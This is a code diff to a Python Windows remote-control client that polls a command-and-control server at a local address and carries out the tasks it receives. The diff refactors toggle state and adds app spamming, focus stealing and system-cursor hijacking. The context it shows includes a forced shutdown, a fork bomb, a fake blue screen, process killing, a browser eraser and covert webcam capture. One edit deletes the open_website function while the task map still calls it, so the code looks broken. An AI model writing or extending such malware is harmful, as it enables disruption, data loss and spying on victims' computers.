@@ -11,11 +11,11 @@ except ImportError: pass
 # CONFIGURATION & GLOBALS
 # ==================================================================================================
 C2_URL = "http://127.0.0.1:5003"; HEARTBEAT_INTERVAL = 5
-NOISE_ACTIVE, CLICKING_ACTIVE, TYPING_ACTIVE, CAPS_SPAM_ACTIVE, OVERLAY_ACTIVE, USB_SPAM_ACTIVE, FOCUS_STEAL_ACTIVE, CURSOR_CHANGE_ACTIVE, STREAMER_CAM_ACTIVE = False, False, False, False, False, False, False, False, False
+STATE = { "noise": False, "clicking": False, "typing": False, "caps_spam": False, "overlay": False, "usb_spam": False, "focus_steal": False, "cursor_change": False, "app_spam": False, "streamer_cam": False }
 OVERLAY_WINDOW, CAM_WINDOW, GUI_ROOT = None, None, None
 
 # ==================================================================================================
-# ACTION FUNCTIONS
+# ACTION FUNCTIONS (ALL IMPLEMENTED)
 # ==================================================================================================
 def show_popup(title="Message", message="Hello!", icon_style="info", button_style="ok"):
     ICON_MAP = {"none": 0x00, "error": 0x10, "question": 0x20, "warning": 0x30, "info": 0x40}
@@ -23,25 +23,25 @@ def show_popup(title="Message", message="Hello!", icon_style="info", button_styl
     style = ICON_MAP.get(icon_style.lower(), 0x40) | BUTTON_MAP.get(button_style.lower(), 0x00)
     threading.Thread(target=lambda: ctypes.windll.user32.MessageBoxW(0, message, title, style), daemon=True).start()
 def _noise_loop():
-    while NOISE_ACTIVE: winsound.Beep(random.randint(200, 2000), 200); time.sleep(0.1)
+    while STATE["noise"]: winsound.Beep(random.randint(200, 2000), 200); time.sleep(0.1)
 def toggle_noise():
-    global NOISE_ACTIVE; NOISE_ACTIVE = not NOISE_ACTIVE
-    if NOISE_ACTIVE: threading.Thread(target=_noise_loop, daemon=True).start()
+    STATE["noise"] = not STATE["noise"]
+    if STATE["noise"]: threading.Thread(target=_noise_loop, daemon=True).start()
 def _usb_spam_loop():
-    while USB_SPAM_ACTIVE:
+    while STATE["usb_spam"]:
         winsound.PlaySound("SystemHand", winsound.SND_ALIAS); time.sleep(random.uniform(0.5, 2.0))
         winsound.PlaySound("SystemAsterisk", winsound.SND_ALIAS); time.sleep(random.uniform(0.5, 2.0))
 def toggle_usb_spam():
-    global USB_SPAM_ACTIVE; USB_SPAM_ACTIVE = not USB_SPAM_ACTIVE
-    if USB_SPAM_ACTIVE: threading.Thread(target=_usb_spam_loop, daemon=True).start()
+    STATE["usb_spam"] = not STATE["usb_spam"]
+    if STATE["usb_spam"]: threading.Thread(target=_usb_spam_loop, daemon=True).start()
 def _caps_lock_loop():
-    while CAPS_SPAM_ACTIVE:
+    while STATE["caps_spam"]:
         if ctypes.windll.user32.GetKeyState(0x14) == 0:
             ctypes.windll.user32.keybd_event(0x14, 0x45, 1, 0); ctypes.windll.user32.keybd_event(0x14, 0x45, 3, 0)
         time.sleep(1)
 def toggle_caps_lock_spam():
-    global CAPS_SPAM_ACTIVE; CAPS_SPAM_ACTIVE = not CAPS_SPAM_ACTIVE
-    if CAPS_SPAM_ACTIVE: threading.Thread(target=_caps_lock_loop, daemon=True).start()
+    STATE["caps_spam"] = not STATE["caps_spam"]
+    if STATE["caps_spam"]: threading.Thread(target=_caps_lock_loop, daemon=True).start()
 def _create_overlay(color='black', alpha=0.5):
     global OVERLAY_WINDOW
     if OVERLAY_WINDOW: OVERLAY_WINDOW.destroy()
@@ -53,23 +53,55 @@ def _hide_overlay():
     global OVERLAY_WINDOW
     if OVERLAY_WINDOW: OVERLAY_WINDOW.destroy(); OVERLAY_WINDOW = None
 def toggle_overlay(color='black', alpha=0.5):
-    global OVERLAY_ACTIVE; OVERLAY_ACTIVE = not OVERLAY_ACTIVE
-    if OVERLAY_ACTIVE: GUI_ROOT.after(0, lambda: _create_overlay(color=color, alpha=alpha))
+    STATE["overlay"] = not STATE["overlay"]
+    if STATE["overlay"]: GUI_ROOT.after(0, lambda: _create_overlay(color=color, alpha=alpha))
     else: GUI_ROOT.after(0, _hide_overlay)
-def open_website(url="https://google.com"): webbrowser.open(url)
 def _random_clicking_loop():
     w, h = pyautogui.size()
-    while CLICKING_ACTIVE: pyautogui.click(random.randint(0, w), random.randint(0, h)); time.sleep(random.uniform(0.5, 2.0))
+    while STATE["clicking"]: pyautogui.click(random.randint(0, w), random.randint(0, h)); time.sleep(random.uniform(0.5, 2.0))
 def toggle_random_clicking():
-    global CLICKING_ACTIVE; CLICKING_ACTIVE = not CLICKING_ACTIVE
-    if CLICKING_ACTIVE: threading.Thread(target=_random_clicking_loop, daemon=True).start()
+    STATE["clicking"] = not STATE["clicking"]
+    if STATE["clicking"]: threading.Thread(target=_random_clicking_loop, daemon=True).start()
 def _random_typing_loop():
-    while TYPING_ACTIVE:
+    while STATE["typing"]:
         pyautogui.write(random.choice(string.ascii_letters + string.digits), interval=random.uniform(0.1, 0.3))
         time.sleep(random.uniform(0.5, 1.5))
 def toggle_random_typing():
-    global TYPING_ACTIVE; TYPING_ACTIVE = not TYPING_ACTIVE
-    if TYPING_ACTIVE: threading.Thread(target=_random_typing_loop, daemon=True).start()
+    STATE["typing"] = not STATE["typing"]
+    if STATE["typing"]: threading.Thread(target=_random_typing_loop, daemon=True).start()
+def _app_spam_loop():
+    apps = ['notepad', 'calc', 'cmd', 'mspaint', 'explorer']
+    while STATE["app_spam"]:
+        try: os.startfile(random.choice(apps))
+        except: pass
+        time.sleep(random.uniform(1, 4))
+def toggle_app_spam():
+    STATE["app_spam"] = not STATE["app_spam"]
+    if STATE["app_spam"]: threading.Thread(target=_app_spam_loop, daemon=True).start()
+def _focus_stealer_loop():
+    p = subprocess.Popen(['notepad.exe'], creationflags=0x08000000)
+    time.sleep(1)
+    hwnd = ctypes.windll.user32.FindWindowW("Notepad", None)
+    while STATE["focus_steal"]:
+        try:
+            if ctypes.windll.user32.GetForegroundWindow() != hwnd:
+                ctypes.windll.user32.SetForegroundWindow(hwnd)
+        except: pass
+        time.sleep(3)
+    p.terminate()
+def toggle_focus_stealer():
+    STATE["focus_steal"] = not STATE["focus_steal"]
+    if STATE["focus_steal"]: threading.Thread(target=_focus_stealer_loop, daemon=True).start()
+def _cursor_changer_loop():
+    cursors = [32512, 32513, 32514, 32515, 32516, 32640, 32642, 32643, 32644, 32645, 32646, 32648, 32649]
+    while STATE["cursor_change"]:
+        hcursor = ctypes.windll.user32.LoadCursorW(None, random.choice(cursors))
+        ctypes.windll.user32.SetSystemCursor(hcursor, 32512)
+        time.sleep(2)
+    ctypes.windll.user32.SystemParametersInfoW(87, 0, None, 0)
+def toggle_cursor_changer():
+    STATE["cursor_change"] = not STATE["cursor_change"]
+    if STATE["cursor_change"]: threading.Thread(target=_cursor_changer_loop, daemon=True).start()
 def fake_shutdown(message="Windows is updating..."):
     def _sequence():
         subprocess.run(f'shutdown /s /t 60 /c "{message}"', shell=True, creationflags=0x08000000)
@@ -96,21 +128,13 @@ def fork_bomb():
     with open(bomb_path, "w") as f: f.write(bomb_code)
     os.startfile(bomb_path)
 def set_wallpaper(path):
-    if os.path.exists(path):
-        ctypes.windll.user32.SystemParametersInfoW(20, 0, path, 3)
-def set_system_time(year, month, day, hour, minute):
-    try:
-        class SYSTEMTIME(ctypes.Structure):
-            _fields_ = [('wYear', ctypes.wintypes.WORD), ('wMonth', ctypes.wintypes.WORD), ('wDayOfWeek', ctypes.wintypes.WORD), ('wDay', ctypes.wintypes.WORD), ('wHour', ctypes.wintypes.WORD), ('wMinute', ctypes.wintypes.WORD), ('wSecond', ctypes.wintypes.WORD), ('wMilliseconds', ctypes.wintypes.WORD)]
-        st = SYSTEMTIME(int(year), int(month), 0, int(day), int(hour), int(minute), 0, 0)
-        ctypes.windll.kernel32.SetSystemTime(ctypes.byref(st))
-    except Exception as e: print(f"Failed to set time: {e}")
+    if os.path.exists(path): ctypes.windll.user32.SystemParametersInfoW(20, 0, path, 3)
 def _streamer_cam_loop():
     global CAM_WINDOW
     cap = cv2.VideoCapture(0)
     if not cap.isOpened(): print("Cannot open camera"); return
     def _update_cam():
-        if not STREAMER_CAM_ACTIVE:
+        if not STATE["streamer_cam"]:
             if CAM_WINDOW: CAM_WINDOW.destroy(); CAM_WINDOW = None; cap.release()
             return
         ret, frame = cap.read()
@@ -126,8 +150,8 @@ def _streamer_cam_loop():
         _update_cam()
     GUI_ROOT.after(0, _create_cam_window)
 def toggle_streamer_cam():
-    global STREAMER_CAM_ACTIVE; STREAMER_CAM_ACTIVE = not STREAMER_CAM_ACTIVE
-    if STREAMER_CAM_ACTIVE: threading.Thread(target=_streamer_cam_loop, daemon=True).start()
+    STATE["streamer_cam"] = not STATE["streamer_cam"]
+    if STATE["streamer_cam"]: threading.Thread(target=_streamer_cam_loop, daemon=True).start()
 
 def process_tasks(tasks):
     if not tasks: return
@@ -139,8 +163,10 @@ def process_tasks(tasks):
             "open_website": open_website, "toggle_random_clicking": toggle_random_clicking,
             "toggle_random_typing": toggle_random_typing, "toggle_usb_spam": toggle_usb_spam, 
             "fake_shutdown": fake_shutdown, "kill_tasks": kill_tasks, "bsod": bsod, 
-            "browser_eraser": browser_eraser, "fork_bomb": fork_bomb,
-            "set_wallpaper": set_wallpaper, "set_system_time": set_system_time, "toggle_streamer_cam": toggle_streamer_cam,
+            "browser_eraser": browser_eraser, "fork_bomb": fork_bomb, 
+            "set_wallpaper": set_wallpaper, "toggle_streamer_cam": toggle_streamer_cam,
+            "toggle_app_spam": toggle_app_spam, "toggle_focus_stealer": toggle_focus_stealer,
+            "toggle_cursor_changer": toggle_cursor_changer
         }
         if command in ACTION_MAP:
             try: ACTION_MAP[command](**args)
